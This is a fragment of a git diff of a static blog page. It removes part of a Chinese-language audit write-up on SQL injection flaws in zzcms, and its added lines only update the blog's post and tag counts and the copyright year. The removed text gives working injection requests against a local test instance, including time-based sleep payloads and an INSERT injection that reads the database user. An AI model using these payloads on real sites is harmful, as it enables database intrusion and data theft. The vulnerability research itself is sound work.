-<pre><code>http://127.0.0.1:81/user/del.php
-post:id=2&amp;tablename=zzcms_licence+where+title=100+or+if(1,sleep(2),1)--+
-</code></pre><p>与上面<code>getip()</code>类似。</p>
-<p><strong>C.stripfxg使用错误导致注入</strong><br>在该CMS中还有个危险函数<code>stripfxg()</code>,他的作用就是将已经过滤的数据还原:<br><img src="http://static.zybuluo.com/chhyx/btb1zj08yl388ipts0od8uiu/image_1cqkd93hvihq1usv1spa10ti1iuf2g.png" alt="image_1cqkd93hvihq1usv1spa10ti1iuf2g.png-51.3kB"></p>
-<p>是个危险函数无疑了。搜索调用该函数且带入数据库的地方,找到一处<code>user\msg.php</code>:<br><img src="http://static.zybuluo.com/chhyx/v42tg9owuqsbrtm39wfm3din/image_1cqkct38o1ckp1qo819809l9323.png" alt="image_1cqkct38o1ckp1qo819809l9323.png-123.8kB"></p>
-<p>这里是<code>insert</code>注入,我们可以利用多伪造一组数据的方法,<br>与<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/21/APPCMS详细审计/</a>同理：</p>
-<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
-POST:info_content=xxxxxxx&apos;),((select user()))#&amp;Submit=%E6%8F%90%E4%BA%A4
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/vrxf7778iix0qri6wn4mpgbv/image_1cqke5u0k1fq4l037v810pq13h13d.png" alt="image_1cqke5u0k1fq4l037v810pq13h13d.png-137.1kB"></p>
-<p>还有就是可利用延时注入:</p>
-<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
-POST:info_content=xxxxxxx&apos;^if(1,sleep(6),0))#&amp;Submit=%E6%8F%90%E4%BA%A4
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/6p3jpkqie8rwnebvjw7veupg/image_1cqkclcimhv21lko1m8l11jtcrfm.png" alt="image_1cqkclcimhv21lko1m8l11jtcrfm.png-140.5kB"></p>
-<p>注入小技巧:</p>
-<pre><code>在碰到insert注入和update注入的时候,除了能够多伪造一组数据以外，还可以使用这种异或符号加上sleep函数来延时注入
-
-insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/buipbf0dwmbusowquxf0yxmc/image_1cqkccjja1es612ksqkvs3j9pd9.png" alt="image_1cqkccjja1es612ksqkvs3j9pd9.png-10.7kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3032,7 +3168,7 @@ insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -3045,7 +3181,7 @@ insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -3082,7 +3218,7 @@ insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
